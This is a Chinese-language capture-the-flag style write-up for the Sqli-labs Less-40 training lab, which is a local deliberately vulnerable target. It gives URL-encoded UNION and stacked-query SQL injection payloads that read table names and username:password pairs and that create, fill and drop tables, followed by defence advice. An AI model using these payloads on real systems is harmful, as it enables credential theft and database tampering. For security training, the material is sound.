## 题目: Sqli‑labs Less‑40

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，回显 `Your Username is : ...` / `Your Password is : ...`。标题是 `Less‑40 **stacked Query String type Blind**`。和 Less‑38/39 一样使用 `mysqli_multi_query()`，闭合方式为 **`')`**。

## 核心原理与前置分析
源码关键行：
```php
$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```
`$id` 被单引号 + 圆括号包裹，payload 需要使用 `‑1') ... -- -` 完成闭合。
本关卡 else 分支没有输出`mysqli_error()`，无 SQL 报错回显，标记为 Blind；但联合查询、堆叠注入依旧可用，只是无法借助报错进行注入。
三个堆叠关卡对比：

| 关卡 | 闭合 | SQL 片段 |
| --- | --- | --- |
| Less‑38 | `'` | `id='$id'` |
| Less‑39 | 无（数字） | `id=$id` |
| Less‑40 | `')` | `id=('$id')` |

**解题思路**
1. 使用 `-1') ... -- -` 闭合，确定查询列数和回显位置；
2. UNION 联合查询爆库、表、字段数据，2、3 列为回显位；
3. 使用分号`;`堆叠注入执行写操作，验证多语句执行能力；
4. 堆叠建表迁移数据，配合 UNION 读取表中数据。

## 解题步骤

### 1. 确认闭合与列数

```
GET /sqli-labs/Less-40/?id=-1%27)%20union%20select%201,2,3--%20- HTTP/1.1
Host: 127.0.0.1
```

页面输出：

```
Your Username is : 2
Your Password is : 3
```

payload `')`闭合成功；查询共 3 列，第 2、3 列存在回显。

### 2. 布尔对照测试

```
?id=1%27)%20and%201=1--%20- HTTP/1.1
?id=1%27)%20and%201=2--%20- HTTP/1.1
```

| 请求 | 回显 |
| --- | --- |
| `1') and 1=1-- -` | `Dumb` |
| `1') and 1=2-- -` | 空白 |

> 
> 注意：闭合中的`)`不能省略，括号不匹配会直接触发 SQL 语法错误。

### 3. UNION 联合查询爆破数据

获取当前数据库名
```
?id=-1%27)%20union%20select%201,database(),3--%20- HTTP/1.1
```

获取库内全部表名
```
?id=-1%27)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--%20- HTTP/1.1
```

读取 users 表用户名密码
```
?id=-1%27)%20union%20select%201,group_concat(username,0x3a,password),3%20from%20users--%20- HTTP/1.1
```

实测回显结果：
```
Your Username is : security
Your Username is : emails,referers,uagents,users
Your Username is : Dumb:Dumb,Angelina:I‑kill‑you,...,admin:888888,...
```

### 4. 堆叠注入写操作

```
GET /sqli-labs/Less-40/?id=1%27);%20create%20table%20zz_t40(a%20int)--%20- HTTP/1.1
GET /sqli-labs/Less-40/?id=1%27);%20insert%20into%20zz_t40%20values(789)--%20- HTTP/1.1
```
页面依旧回显`Dumb`，数据库执行查询：
```
SELECT * FROM zz_t40;   -- 查询结果789
```
> 
> 分号后的 SQL 语句已执行，但是不会在页面回显。

### 5. 堆叠 + UNION 组合利用
创建存储数据的 dump40 表
```
GET /sqli-labs/Less-40/?id=1%27);%20create%20table%20dump40(username%20varchar(100),password%20varchar(100))--%20- HTTP/1.1
```

将 users 表全部数据插入 dump40
```
GET /sqli-labs/Less-40/?id=1%27);%20insert%20into%20dump40%20select%20username,password%20from%20users--%20- HTTP/1.1
```

union 读取 dump40 表内容
```
GET /sqli-labs/Less-40/?id=-1%27)%20union%20select%201,group_concat(username,0x3a,password),3%20from%20dump40--%20- HTTP/1.1
```

清理测试表
```
GET /sqli-labs/Less-40/?id=1%27);%20drop%20table%20dump40--%20- HTTP/1.1
```

## 踩坑记录
1. 仅写`'`缺少`)`。原始 SQL 为`id=('$id')`，`')`必须同时闭合，缺失括号会语法报错。
2. Blind 标签误导：Blind 只是关闭报错回显，UNION 查询结果仍然输出页面，不是盲注。
3. 堆叠后的 SELECT 语句不会回显。`mysqli_store_result()`只会读取第一条 SQL 结果集，后面 SQL 执行但是不展示。
4. URL 编码问题：单引号在 url 中需要编码为`%27`。
5. 写操作完成要清理临时表，避免污染靶场 security 库。

## 知识点总结
- **括号闭合注入**：`id=('$id')`使用`')`闭合，是 Less‑31 之后高频的闭合形式。
- **堆叠注入**：依赖`mysqli_multi_query()`函数，`;`可以执行多条 SQL；页面只返回第一条 SQL 结果集。
- 三类堆叠关卡对比：`'`(Less‑38)、数字无引号 (Less‑39)、`')`(Less‑40)，payload 差异仅在于闭合部分。
- Blind 含义：**无报错回显≠没有回显**，UNION 联合查询可以直接获取数据。
- **防御方案**：使用预编译 + 参数绑定；id 参数强制转换 int 类型；数据库账号最小权限；关闭多语句查询功能。
